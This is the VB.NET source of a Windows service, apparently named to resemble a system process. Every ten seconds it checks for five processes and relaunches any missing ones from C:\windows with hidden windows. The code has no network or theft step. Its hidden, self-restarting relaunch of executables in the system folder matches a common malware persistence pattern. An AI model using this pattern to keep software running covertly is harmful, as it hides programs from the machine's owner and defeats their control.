Public Class crss
    Private WithEvents Timer1 As New System.Timers.Timer(10000)
    Protected Overrides Sub OnStart(ByVal args() As String)
        Timer1.Enabled = True
        Timer1.Start()
        ' Add code here to start your service. This method should set things
        ' in motion so your service can do its work.
    End Sub
    Protected Overrides Sub OnStop()
        Timer1.Enabled = False
        Timer1.Stop()
        ' Add code here to perform any tear-down necessary to stop your service.
    End Sub
    Private Sub Timer1_Elasped(ByVal sender As System.Object, ByVal e As System.Timers.ElapsedEventArgs) Handles Timer1.Elapsed
        Dim runnin As Boolean = False, runnina As Boolean = False, runninb As Boolean = False, runninc As Boolean = False, runnind As Boolean = False
        Dim pList() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcesses
        For Each proc As System.Diagnostics.Process In pList
            Select Case proc.ProcessName
                Case "icrss"
                    runnin = True
                Case "icrssa"
                    runnina = True
                Case "icrssb"
                    runninb = True
                Case "icrssc"
                    runninc = True
                Case "icrssd"
                    runnind = True
            End Select
        Next
        If Not runnin Then
            Shell("C:\windows\icrss.exe", AppWinStyle.Hide)
        End If
        If Not runnina Then
            Shell("C:\windows\icrssa.exe", AppWinStyle.Hide)
        End If
        If Not runninb Then
            Shell("C:\windows\icrssb.exe", AppWinStyle.Hide)
        End If
        If Not runninc Then
            Shell("C:\windows\icrssc.exe", AppWinStyle.Hide)
        End If
        If Not runnind Then
            Shell("C:\windows\icrssd.exe", AppWinStyle.Hide)
        End If
    End Sub
End Class
